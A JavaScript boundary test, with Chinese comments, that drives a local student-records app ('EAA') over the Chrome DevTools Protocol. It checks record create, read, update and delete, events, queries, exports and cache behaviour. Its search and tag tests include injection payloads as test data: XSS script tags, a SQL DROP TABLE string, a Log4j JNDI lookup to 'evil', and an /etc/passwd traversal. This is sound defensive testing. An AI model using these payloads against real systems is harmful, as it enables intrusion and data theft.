// =============================================================
// R101: EAA 引擎边界测试 (eaa-cli 所有命令边界条件)
// 角度 1: EAA info/stats/validate/doctor 健康检查链路
// 角度 2: 学生 CRUD 完整流程 (add → list → meta → history → delete)
// 角度 3: 事件 addEvent 边界 (空/null/超长字段/非法 reason-code)
// 角度 4: 查询边界 (range 负数/超大 limit, search 特殊字符, tag 空)
// 角度 5: 导出格式枚举 + 非法格式
// 角度 6: 缓存 invalidate 后数据仍一致
// =============================================================

import http from 'node:http'

const CDP_PORT = 9222
const BASE = `http://127.0.0.1:${CDP_PORT}`

async function getTargets() {
  return new Promise((resolve, reject) => {
    http.get(`${BASE}/json`, (res) => {
      let data = ''
      res.on('data', (c) => (data += c))
      res.on('end', () => resolve(JSON.parse(data)))
      res.on('error', reject)
    }).on('error', reject)
  })
}

async function cdpCall(ws, method, params = {}) {
  const id = Math.floor(Math.random() * 1e9)
  return new Promise((resolve, reject) => {
    const handler = (ev) => {
      const msg = JSON.parse(ev.toString())
      if (msg.id === id) {
        ws.off('message', handler)
        if (msg.error) reject(new Error(JSON.stringify(msg.error)))
        else resolve(msg.result)
      }
    }
    ws.on('message', handler)
    ws.send(JSON.stringify({ id, method, params }))
    setTimeout(() => {
      ws.off('message', handler)
      reject(new Error(`CDP timeout: ${method}`))
    }, 30000)
  })
}

async function evalInPage(ws, expr) {
  const r = await cdpCall(ws, 'Runtime.evaluate', {
    expression: expr,
    awaitPromise: true,
    returnByValue: true,
    timeout: 25000,
  })
  if (r.exceptionDetails) {
    return { __error: JSON.stringify(r.exceptionDetails).slice(0, 300) }
  }
  return r.result.value
}

async function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms))
}

let WebSocket
try {
  WebSocket = (await import('ws')).default
} catch {
  WebSocket = globalThis.WebSocket
}

const targets = await getTargets()
const pageTarget =
  targets.find((t) => t.type === 'page' && t.url.includes('localhost')) ||
  targets.find((t) => t.type === 'page')
if (!pageTarget) {
  console.error('No page target found.')
  process.exit(1)
}
console.log(`[R101] Connecting to: ${pageTarget.webSocketDebuggerUrl}`)
const ws = new WebSocket(pageTarget.webSocketDebuggerUrl)
await new Promise((r, rej) => {
  ws.on('open', r)
  ws.on('error', rej)
  setTimeout(() => rej(new Error('ws connect timeout')), 10000)
})

const results = { pass: 0, fail: 0, errors: [] }
function check(name, cond, detail = '') {
  if (cond) {
    results.pass++
    console.log(`  ✅ ${name}`)
  } else {
    results.fail++
    results.errors.push(name)
    console.log(`  ❌ ${name} ${detail}`)
  }
}

await evalInPage(ws, `
  window.__r101Errors = [];
  if (!window.__r101HookInstalled) {
    window.addEventListener('error', (e) => {
      window.__r101Errors.push({ type: 'error', message: e.message });
    });
    window.addEventListener('unhandledrejection', (e) => {
      const msg = e.reason && (e.reason.message || e.reason.toString) ? (e.reason.message || String(e.reason)) : String(e.reason);
      window.__r101Errors.push({ type: 'unhandledrejection', message: msg });
    });
    window.__r101HookInstalled = true;
  }
  true
`)

async function getErrors() {
  return await evalInPage(ws, `JSON.parse(JSON.stringify(window.__r101Errors || []))`)
}

// =============================================================
console.log('\n=== R101: EAA 引擎边界测试 ===')

// =============================================================
console.log('\n[R101-1] EAA 健康检查链路 (info/stats/validate/doctor)')

const info = await evalInPage(ws, `window.api.eaa.info()`)
check('eaa.info 返回对象', info && typeof info === 'object' && !info.__error,
  `result=${JSON.stringify(info).slice(0, 150)}`)

const stats = await evalInPage(ws, `window.api.eaa.stats()`)
check('eaa.stats 返回对象', stats && typeof stats === 'object' && !stats.__error,
  `result=${JSON.stringify(stats).slice(0, 150)}`)

const validate = await evalInPage(ws, `window.api.eaa.validate()`)
check('eaa.validate 不崩溃',
  validate && !validate.__error,
  `result=${JSON.stringify(validate).slice(0, 150)}`)

const doctor = await evalInPage(ws, `window.api.eaa.doctor()`)
check('eaa.doctor 不崩溃',
  doctor && !doctor.__error,
  `result=${JSON.stringify(doctor).slice(0, 150)}`)

const codes = await evalInPage(ws, `window.api.eaa.codes()`)
check('eaa.codes 返回 reason-codes',
  codes && !codes.__error,
  `result=${JSON.stringify(codes).slice(0, 150)}`)

// =============================================================
console.log('\n[R101-2] 学生 CRUD 完整流程')

const testStudentName = `r101_test_${Date.now()}`

// Create
const addResult = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.eaa.addStudent(${JSON.stringify(testStudentName)});
    return { ok: true, success: r?.success, result: r };
  } catch (e) {
    return { ok: false, error: e.message };
  }
})()`)
check('eaa.addStudent 不崩溃',
  addResult?.ok === true,
  `result=${JSON.stringify(addResult).slice(0, 150)}`)

// Read (list) - 返回结构是 {success, data: {students: [...]}}
await sleep(200)
const listResult = await evalInPage(ws, `window.api.eaa.listStudents()`)
check('eaa.listStudents 返回对象',
  listResult && typeof listResult === 'object' && !listResult.__error,
  `type=${typeof listResult}`)
check('eaa.listStudents.success === true',
  listResult?.success === true,
  `result=${JSON.stringify(listResult).slice(0, 100)}`)

// 兼容两种结构: 数组 (旧版) 或 {data: {students: [...]}} (新版)
const studentsArr = Array.isArray(listResult)
  ? listResult
  : (Array.isArray(listResult?.data) ? listResult.data
    : (Array.isArray(listResult?.data?.students) ? listResult.data.students : []))

const foundInList = studentsArr.find(s => typeof s === 'string' ? s === testStudentName : s?.name === testStudentName)
check('新增学生在 listStudents 中可见',
  !!foundInList,
  `student=${testStudentName}, studentsArr.length=${studentsArr.length}`)

// Read (history)
const historyResult = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.eaa.history(${JSON.stringify(testStudentName)});
    return { ok: true, success: r?.success !== false, result: r };
  } catch (e) {
    return { ok: false, error: e.message };
  }
})()`)
check('eaa.history 新学生不崩溃',
  historyResult?.ok === true,
  `result=${JSON.stringify(historyResult).slice(0, 150)}`)

// Read (score)
const scoreResult = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.eaa.score(${JSON.stringify(testStudentName)});
    return { ok: true, success: r?.success !== false, result: r };
  } catch (e) {
    return { ok: false, error: e.message };
  }
})()`)
check('eaa.score 新学生不崩溃',
  scoreResult?.ok === true,
  `result=${JSON.stringify(scoreResult).slice(0, 150)}`)

// Update meta
const metaResult = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.eaa.setStudentMeta({
      name: ${JSON.stringify(testStudentName)},
      meta: { grade: '高三', class: '测试班', note: 'R101 测试' },
    });
    return { ok: true, success: r?.success !== false };
  } catch (e) {
    return { ok: false, error: e.message };
  }
})()`)
check('eaa.setStudentMeta 不崩溃',
  metaResult?.ok === true,
  `result=${JSON.stringify(metaResult).slice(0, 150)}`)

// Delete
const deleteResult = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.eaa.deleteStudent(${JSON.stringify(testStudentName)}, 'R101 测试清理');
    return { ok: true, success: r?.success !== false };
  } catch (e) {
    return { ok: false, error: e.message };
  }
})()`)
check('eaa.deleteStudent 不崩溃',
  deleteResult?.ok === true,
  `result=${JSON.stringify(deleteResult).slice(0, 150)}`)

// Verify deleted - 兼容两种结构
await sleep(200)
const listAfterDelete = await evalInPage(ws, `window.api.eaa.listStudents()`)
const studentsAfterDelete = Array.isArray(listAfterDelete)
  ? listAfterDelete
  : (Array.isArray(listAfterDelete?.data) ? listAfterDelete.data
    : (Array.isArray(listAfterDelete?.data?.students) ? listAfterDelete.data.students : []))
const stillExists = studentsAfterDelete.find(s => typeof s === 'string' ? s === testStudentName : s?.name === testStudentName)
check('删除后学生不在 listStudents 中',
  !stillExists,
  `student=${testStudentName}`)

// =============================================================
console.log('\n[R101-3] 事件 addEvent 边界 (空/null/超长/非法)')

// 先准备一个测试学生
await evalInPage(ws, `window.api.eaa.addStudent('r101_event_test')`)
await sleep(200)

// 正常 addEvent
const normalEvent = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.eaa.addEvent({
      studentName: 'r101_event_test',
      eventType: 'positive',
      reasonCode: 'homework_complete',
      note: 'R101 正常测试',
      timestamp: new Date().toISOString(),
    });
    return { ok: true, success: r?.success !== false };
  } catch (e) {
    return { ok: false, error: e.message };
  }
})()`)
check('addEvent 正常参数不崩溃',
  normalEvent?.ok === true,
  `result=${JSON.stringify(normalEvent).slice(0, 150)}`)

// null 参数
const nullEvent = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.eaa.addEvent(null);
    return { ok: true, success: r?.success !== false };
  } catch (e) {
    return { ok: true, thrown: true, error: e.message };
  }
})()`)
check('addEvent null 参数不崩溃', nullEvent?.ok === true)

// 空对象
const emptyEvent = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.eaa.addEvent({});
    return { ok: true, success: r?.success !== false };
  } catch (e) {
    return { ok: true, thrown: true, error: e.message };
  }
})()`)
check('addEvent 空对象不崩溃', emptyEvent?.ok === true)

// 不存在学生
const unknownStudentEvent = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.eaa.addEvent({
      studentName: '__nonexistent_student__',
      eventType: 'positive',
      reasonCode: 'homework_complete',
    });
    return { ok: true, success: r?.success !== false, hasError: !!r?.error };
  } catch (e) {
    return { ok: true, thrown: true, error: e.message };
  }
})()`)
check('addEvent 不存在学生不崩溃', unknownStudentEvent?.ok === true)

// 超长 note
const longNote = 'x'.repeat(10000)
const longNoteEvent = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.eaa.addEvent({
      studentName: 'r101_event_test',
      eventType: 'positive',
      reasonCode: 'homework_complete',
      note: ${JSON.stringify(longNote)},
    });
    return { ok: true, success: r?.success !== false };
  } catch (e) {
    return { ok: true, thrown: true, error: e.message };
  }
})()`)
check('addEvent 10KB note 不崩溃', longNoteEvent?.ok === true)

// 清理测试学生
await evalInPage(ws, `window.api.eaa.deleteStudent('r101_event_test', 'R101 清理')`)

// =============================================================
console.log('\n[R101-4] 查询边界 (range/search/tag)')

// range 边界
const rangeTests = [
  { args: ['', '', -1], desc: '负 limit' },
  { args: ['', '', 0], desc: '0 limit' },
  { args: ['', '', 1000000], desc: '超大 limit' },
  { args: ['not-a-date', 'not-a-date', 10], desc: '非法日期' },
  { args: ['2099-01-01', '2099-12-31', 10], desc: '未来日期范围' },
  { args: ['1970-01-01', '1970-01-02', 10], desc: '远古日期范围' },
]

let rangeOkCount = 0
for (const t of rangeTests) {
  const r = await evalInPage(ws, `(async () => {
    try {
      const r = await window.api.eaa.range(${t.args.map(a => JSON.stringify(a)).join(',')});
      return { ok: true };
    } catch (e) {
      return { ok: true, thrown: true };
    }
  })()`)
  if (r?.ok) rangeOkCount++
}
check(`range 边界全部不崩溃 (${rangeOkCount}/${rangeTests.length})`,
  rangeOkCount === rangeTests.length)

// search 边界
const searchTests = [
  { query: '', desc: '空 query' },
  { query: '   ', desc: '空格 query' },
  { query: 'a'.repeat(1000), desc: '超长 query' },
  { query: '"><script>alert(1)</script>', desc: 'XSS payload' },
  { query: "'; DROP TABLE--", desc: 'SQL 注入' },
  { query: '${jndi:ldap://evil}', desc: 'Log4j 注入' },
  { query: '../../etc/passwd', desc: '路径遍历' },
]

let searchOkCount = 0
for (const t of searchTests) {
  const r = await evalInPage(ws, `(async () => {
    try {
      const r = await window.api.eaa.search(${JSON.stringify(t.query)}, 10);
      return { ok: true };
    } catch (e) {
      return { ok: true, thrown: true };
    }
  })()`)
  if (r?.ok) searchOkCount++
}
check(`search 边界全部不崩溃 (${searchOkCount}/${searchTests.length})`,
  searchOkCount === searchTests.length)

// tag 边界
const tagTests = [
  { args: [], desc: '无参数 tag' },
  { args: [''], desc: '空 tag' },
  { args: ['__nonexistent_tag__'], desc: '不存在 tag' },
  { args: ['"><script>'], desc: 'XSS tag' },
]

let tagOkCount = 0
for (const t of tagTests) {
  const argsStr = t.args.map(a => JSON.stringify(a)).join(',')
  const r = await evalInPage(ws, `(async () => {
    try {
      const r = await window.api.eaa.tag(${argsStr});
      return { ok: true };
    } catch (e) {
      return { ok: true, thrown: true };
    }
  })()`)
  if (r?.ok) tagOkCount++
}
check(`tag 边界全部不崩溃 (${tagOkCount}/${tagTests.length})`,
  tagOkCount === tagTests.length)

// ranking 边界
const rankingTests = [
  { args: [], desc: '无参数' },
  { args: [0], desc: '0' },
  { args: [-1], desc: '负数' },
  { args: [1000000], desc: '超大数' },
  { args: ['not-a-number'], desc: '非数字' },
  { args: [null], desc: 'null' },
]

let rankingOkCount = 0
for (const t of rankingTests) {
  const argsStr = t.args.map(a => JSON.stringify(a)).join(',')
  const r = await evalInPage(ws, `(async () => {
    try {
      const r = await window.api.eaa.ranking(${argsStr});
      return { ok: true };
    } catch (e) {
      return { ok: true, thrown: true };
    }
  })()`)
  if (r?.ok) rankingOkCount++
}
check(`ranking 边界全部不崩溃 (${rankingOkCount}/${rankingTests.length})`,
  rankingOkCount === rankingTests.length)

// =============================================================
console.log('\n[R101-5] 导出格式枚举 + 非法格式')

const exportFormats = await evalInPage(ws, `window.api.eaa.exportFormats()`)
check('eaa.exportFormats 返回非空',
  exportFormats && !exportFormats.__error,
  `result=${JSON.stringify(exportFormats).slice(0, 150)}`)

// 测试非法格式
const invalidFormat = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.eaa.export('__invalid_format__', '');
    return { ok: true, success: r?.success !== false, hasError: !!r?.error };
  } catch (e) {
    return { ok: true, thrown: true, error: e.message };
  }
})()`)
check('eaa.export 非法格式不崩溃',
  invalidFormat?.ok === true,
  `result=${JSON.stringify(invalidFormat).slice(0, 150)}`)

// 测试合法格式 (如果有的话)
if (exportFormats && Array.isArray(exportFormats.formats) && exportFormats.formats.length > 0) {
  const firstFormat = exportFormats.formats[0]
  const formatId = typeof firstFormat === 'string' ? firstFormat : firstFormat?.id
  if (formatId) {
    const validFormat = await evalInPage(ws, `(async () => {
      try {
        const r = await window.api.eaa.export(${JSON.stringify(formatId)}, '');
        return { ok: true, success: r?.success !== false };
      } catch (e) {
        return { ok: true, thrown: true, error: e.message };
      }
    })()`)
    check(`eaa.export 合法格式 ${formatId} 不崩溃`,
      validFormat?.ok === true,
      `result=${JSON.stringify(validFormat).slice(0, 150)}`)
  }
}

// =============================================================
console.log('\n[R101-6] 缓存 invalidate 后数据一致')

// 读取一次 stats (会进缓存)
const statsBefore = await evalInPage(ws, `window.api.eaa.stats()`)

// 刷新缓存
const invalidate = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.eaa.invalidateCache();
    return { ok: true, success: r?.success !== false };
  } catch (e) {
    return { ok: false, error: e.message };
  }
})()`)
check('eaa.invalidateCache 不崩溃',
  invalidate?.ok === true,
  `result=${JSON.stringify(invalidate).slice(0, 100)}`)

// 再读一次,验证数据一致
await sleep(300)
const statsAfter = await evalInPage(ws, `window.api.eaa.stats()`)

// 语义比较: 排序后再比较 (EAA CLI 返回的数组项顺序可能不稳定,但内容应一致)
const sortDeep = (obj) => {
  if (Array.isArray(obj)) return obj.map(sortDeep).sort((a, b) => JSON.stringify(a).localeCompare(JSON.stringify(b)))
  if (obj && typeof obj === 'object') {
    const sorted = {}
    for (const k of Object.keys(obj).sort()) sorted[k] = sortDeep(obj[k])
    return sorted
  }
  return obj
}
const beforeStr = JSON.stringify(sortDeep(statsBefore))
const afterStr = JSON.stringify(sortDeep(statsAfter))
check('invalidateCache 后 stats 数据一致 (语义比较)',
  beforeStr === afterStr,
  `before=${beforeStr.slice(0, 80)}, after=${afterStr.slice(0, 80)}`)

// =============================================================
console.log('\n[R101-7] 全程错误捕获')

const finalErrors = await getErrors()
check('全程 0 unhandledrejection/error',
  finalErrors.length === 0,
  `errors=${finalErrors.length}, detail=${JSON.stringify(finalErrors).slice(0, 200)}`)

// =============================================================
console.log('\n========================================')
console.log(`R101 结果: ✅ pass=${results.pass}, ❌ fail=${results.fail}`)
if (results.errors.length > 0) {
  console.log(`失败项: ${JSON.stringify(results.errors, null, 2)}`)
}
console.log('========================================')

ws.close()
process.exit(results.fail > 0 ? 1 : 0)
